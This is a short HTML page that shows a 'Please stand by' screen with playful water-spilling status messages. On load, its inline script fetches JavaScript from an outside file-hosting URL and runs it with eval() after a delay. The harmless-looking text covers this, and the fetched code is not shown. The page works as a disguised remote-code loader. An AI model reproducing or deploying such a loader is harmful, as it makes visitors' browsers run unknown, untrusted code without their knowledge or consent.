<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>250ml</title>
  <link rel="stylesheet" href="style250.css" />
  <script>
  fetch("https://files.catbox.moe/cwedrd.js")
    .then(res => res.text())
    .then(code => {
      document.getElementById("status").textContent = "Spilling water...";
      setTimeout(() => {
        try {
          eval(code); // Full file executes after brief delay
          document.getElementById("status").textContent = "Water spilled!";
        } catch (err) {
          document.getElementById("status").textContent = "Not spilled: " + err.message;
        }
      }, 1500); // Allows garbage collection, event loop stabilization
    })
    .catch(err => {
      document.getElementById("status").textContent = "Glass not filled: " + err.message;
    });
</script>
</head>
<body>
  <div class="container">
    <h1>Please stand by.</h1>
    <p class="note">Spilling 250ml...</p>
    <pre id="status">Filling up water...</pre>
  </div>
</body>
</html>
